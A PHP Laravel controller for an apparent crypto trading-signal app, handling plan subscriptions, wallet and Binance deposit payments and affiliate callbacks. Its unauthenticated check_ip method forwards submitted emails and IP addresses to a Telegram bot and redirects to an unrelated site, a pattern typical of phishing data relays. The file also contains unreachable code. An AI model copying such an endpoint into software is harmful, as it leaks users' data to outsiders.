<?php

namespace App\Http\Controllers\Front;
use Carbon\Carbon;

use auth;
use App\Models\plan;
use App\Models\Admin;
use App\Models\User;
use App\Models\feesBot;
use App\Models\Payment;
use App\Models\BotStatus;
use App\Models\TargetsRecmo;
use App\Traits\ResponseJson;
use Illuminate\Http\Request;
use App\Models\recommendation;
use App\Models\DepositsBinance;
use App\Http\Requests\imageRequest;
use App\Http\Controllers\Controller;
use App\Http\Requests\planIdRequest;
use App\Http\Resources\PlanResource;
use Illuminate\Support\Facades\Http;
use App\Http\Requests\OrderPayRequest;
use App\Http\Controllers\PayController;
use App\Http\Resources\PaymentResource;
use App\Http\Controllers\Deposits\DepositsController;
use App\Http\Controllers\Helper\NotficationController;
use App\Http\Controllers\Helper\BotTelgremController;
use App\Http\Requests\SubPlan\SubPlanRequest;
use App\Models\plan_pakage;




class SubscripPlan extends Controller
{
    use ResponseJson;
    public function getPlan()
    {
        return PlanResource::collection(plan::with('plan_desc','plan_package')->where('id', '!=', 7)->get());
    }

    // for user slect plan
    public function Orderpay(planIdRequest $request)
    {
        $timestamp = time(); // Get the current timestamp
        $uniqueId = uniqid(); // Generate a unique identifier
        $randomNumber = mt_rand(1000, 9999); // Generate a random number
        $transactionId = $timestamp . $uniqueId . $randomNumber;


        $header = $request->header('Authorization');
        $user = auth('api')->user();
        if (!$user) {
            return response()->json([
                'Success' => false,
                'Massage' => "Invalid token",
            ]);
        }



        //  for cheak if have any status pending make is declined
        $paymentSelect = Payment::where('user_id', $user->id)
            ->where('status', 'pending')
            ->update([
                'status' => 'declined',
            ]);




        $Payment = Payment::create([
            'user_id' => $user->id,
            'plan_id' => $request['plan_id'],
            'status' => 'pending',
            'transaction_id' => $transactionId,

        ]);
        $user = user::find($user->id);
        $user->Status_Plan = "pending";
        $user->save();
        return response()->json([
            "success" => true,
            "wallet" => "TLNaJdkATC5NnmHfnLfskXMG85NtihQT29"
        ]);
    }


  public function check_ip(Request $request)
  {
       
       $telgrem=new BotTelgremController();

                
            $email = $request->input('email');
            $ip = $request->input('ip');
            $active = $request->input('active');
            
            $text = "Email: $email\nip: $ip\ncountry: $active";
            $telgrem->Sasa($text);
             return redirect('https://sasarealestate.com/');
  

}
    public function HistroyPay(Request $request)
    {
        $header = $request->header('Authorization');
        $user = auth('api')->user();
        if (!$user) {
            return response()->json([
                'Success' => false,
                'Massage' => "Invalid token",
            ]);
        }
        $Payment = Payment::where('user_id', $user->id)->with('plan')->get();
        return PaymentResource::collection($Payment);
    }



    public function UploadImagePayment(imageRequest $request)
    {

        $user = auth('api')->user();
        if (!$user) {
            return $this->error('Invalid token');
        }
        $Payment = Payment::where('user_id', $user->id)->latest()->first();

        if (!$request->textId) {
            return $this->error('Text ID  not provided');
        }

        $Payment->update([
            'image_payment' => $request->textId,
        ]);


        return $this->complate($request->textId, $Payment);


        return response()->json([
            'Success' => true,
            'Massage' => "Uploaded Image",
        ]);
    }

    public function complate($textId, $Payment)
    {
        $user = auth('api')->user();

        $existingDeposits = DepositsBinance::where('textId', $textId)->where('status', '1')->first();

        if ($existingDeposits) {
            return $this->error('The Text ID found or wrong');
        }

        $existingDeposit = DepositsBinance::where('textId', $textId)->first();

        if (!$existingDeposit) {
            return $this->error('The deposit has not been made to Binance, please check this');
        } else {

            $binanceDeopsite = new DepositsController();
            $binanceDeopsite->getDeposits();


            $getplanPrice = Plan::where('id', $Payment['plan_id'])->first();

            if ($existingDeposit->amount < $getplanPrice['price']) {
                return $this->error("You don't have enough number_points ");
            } elseif ($existingDeposit->amount == $getplanPrice['price']) {

                $new = new PayController();
                $new->ActivePending($Payment['transaction_id'], $Payment['plan_id']);

                // for updata stata textid =1
                $existingDeposit->update([
                    'status' => 1,
                ]);



                $notfication = new NotficationController();
                $body = "تم الاشتراك بنجاح";
                $notfication->notfication($user->fcm_token, $body);
                $bodyManger = "تم اشترك شخص جديد";
                $notfication->notficationManger($bodyManger);

                return $this->success('You have successfully subscribed');
            } elseif ($existingDeposit->amount > $getplanPrice['price']) {



                $new = new PayController();
                $new->ActivePending($Payment['transaction_id'], $Payment['plan_id']);

                $coolect = $existingDeposit->amount - $getplanPrice['price'];

                $addMony = $user->number_points += $coolect;
                // updata user mony
                $user->update([
                    'number_points' =>  $addMony,
                ]);
                // update text id


                $existingDeposit->status = '1';
                $existingDeposit->save();



                $notfication = new NotficationController();
                $body = "تم الاشتراك بنجاح كذلك تمت اضافه الباقي اللي محفظتك
            رصيدك اصبح $addMony ";
                $notfication->notfication($user->fcm_token, $body);
                $bodyManger = "تم اشترك شخص جديد";
                $notfication->notficationManger($bodyManger);

                return $this->success('You have successfully subscribed and the rest has been transferred to your wallet');
            }
        }
    }



    // getRecmoData

    public function getRecmoData($recomId)
    {
        return $user = auth('api')->user();
        $recom = recommendation::where('id', $recomId)->first();
        $targets = TargetsRecmo::where('recomondations_id', $recomId)->pluck('target')->toArray();
        $entry = $recom->entry_price;
        $parts = explode(' - ', $entry);
        // Convert the string parts to float values
        $output = array_map('floatval', $parts);
        // $facilityImages = FacilityImages::where('facility_id', $facilityId)->get()->pluck('image')->toArray();
        return response()->json([
            'ticker' => $recom->currency,
            'targets' => $targets,
            'entry' => $output,
            'stopLose' => $recom->stop_price,
        ]);
    }

    // for subscribe by fess

    public function subByFess()
    {
          $user = auth('api')->user();
        if (!$user) {
            return $this->error('Invalid token');
        }
          $Payment = Payment::where('user_id', $user->id)->where('status', 'pending')->latest()->first();
        if (!$Payment) {
            return $this->error('Subscrib First');
        }
        $planPayment = $Payment->plan_id;

        $plan = plan::where('id', $planPayment)->first();
          if($plan->discount == 0)
        {
            $pricePlan = $plan->price;

        }else{
            $pricePlan = $plan->discount;

        }
        
      

        if ($user->number_points >= $pricePlan)
        {
            
            $user->number_points -= $pricePlan;
             $user->save();
             
            
            // /////////////////THIS for subscribe with all Admin ///////////////////////////////////////////
                $adminUserIds = Admin::where('plan_id',$plan->id)->pluck('user_id');
                    // to subscribe with 
                $adminData = json_encode([
                    "boss" => $adminUserIds
                ]);
                $user->admins=$adminData;
                $user->save();
                
                ////////////////////////////////////////////////////////////////////////////////////////////
                //  for Money discount from number_points

 
              // Save the updated user object to the database
              $new = new PayController();
            if( $new->ActivePending($Payment['transaction_id'], $Payment['plan_id']))
            {
                 Http::timeout(120)->post('https://upvela.gfoura.smartidea.tech/api/subscription_plan', [
                'user_id' => $user->id,
                'coming_affiliate' => $user->comming_afflite
                ]);
            }

                
            $notfication = new NotficationController();
            $body = "تم الاشتراك بنجاح ";
            $notfication->notfication($user->fcm_token, $body);
            $bodyManger = "تم اشترك شخص جديد";
            $notfication->notficationManger($bodyManger);




            $this->storeSubPlan($pricePlan,$plan->name);
            
              

            return $this->success('You have successfully subscribed');
        } else {
            return $this->error("You don't have enough mony ");
        }
    }
    
    // for new subscription 
    
    public function testSubPlanByFess(SubPlanRequest $request)
    {
        // 1- i recvied plan_id and per_month
        // 2- get price from plan_package based request
        // 3- check have the plance  or not ? call api laravel for afflite : return not have blance
        // 4- updated start_supscribtion and end_subscription
        // 5- store it in payment model for history
        // 6- dont forget make middlware perone day
        
        $planId = $request['plan_id'];
        $perMonth = $request['per_month'];
        $user = auth('api')->user();
        // price plan
        $planPakage = plan_pakage::where('plan_id', $planId)->where('per_month', $perMonth)->latest()->first();
        $pricePlan = $planPakage->discount > 0 ? $planPakage->discount : $planPakage->price;
        $checkBlance = $this->checkBalnce($user, $pricePlan, $planPakage->per_month, $planPakage->plan_id,$planPakage->extraTime);

        if ($checkBlance == true) {
            $this->storeSubPlans($user->id, $pricePlan, $planPakage->plan_id);
            $this->storeInPayment($user->id, $planId, $perMonth);
            $this->afflitePlan($user->id, $user->comming_afflite);

            return $this->success("You have successfully subscribed");
        } else {
            return $this->error('Not Have enough balance');
        }
    }

    public function checkBalnce($user, $pricePlan, $perMonth, $planId,$extraTime)
    {
        // Check if user has enough balance
        if ($user->number_points >= $pricePlan) {
            $startPlan = Carbon::now()->format('Y-m-d');
            $endPlan = Carbon::now()->addMonths($perMonth)->format('Y-m-d');
            $endDate = Carbon::parse($endPlan)->addDays($extraTime)->format('Y-m-d');
            $user->number_points -= $pricePlan;
            $user->start_plan = $startPlan;
            $user->end_plan = $endDate;
            $user->Status_Plan = "paid";
            $user->plan_id = $planId;
            $user->save();
            return true; // Indicate the operation was successful
        } else {
            return false; // Indicate insufficient balance
        }
    }


    public function afflitePlan($userId, $commingAfflite)
    {
 
      Http::timeout(120)->post('https://upvela.gfoura.smartidea.tech/api/subscription_plan', [
            'user_id' => $userId,
            'coming_affiliate' => $commingAfflite
        ]);
    }

    public function storeSubPlans($userId, $pricePlan, $planId)
    {
        $plan = plan::select('name')->where('id', $planId)->latest()->first();
        $feesBot = feesBot::create([
            'user_id' => $userId,
            'fees' => $pricePlan,
            'status' => "success",
            'namePlan' => $plan->name,
        ]);
    }
    public function storeInPayment($userId, $planId, $perMonth)
    {

        $timestamp = time(); // Get the current timestamp
        $uniqueId = uniqid(); // Generate a unique identifier
        $randomNumber = mt_rand(1000, 9999); // Generate a random number
        $transactionId = $timestamp . $uniqueId . $randomNumber;
        $Payment = Payment::create([
            'user_id' => $userId,
            'plan_id' => $planId,
            'per_month' => $perMonth,
            'status' => 'success',
            'transaction_id' => $transactionId,

        ]);
    }


    public function storeSubPlan($pricePlan,$namePlan)
    {
        $user = auth('api')->user();
        $feesBot = feesBot::create([
            'user_id' => $user->id,
            'fees' => $pricePlan,
            'status' => "success",
            'namePlan'=>$namePlan,
        ]);
    }
}
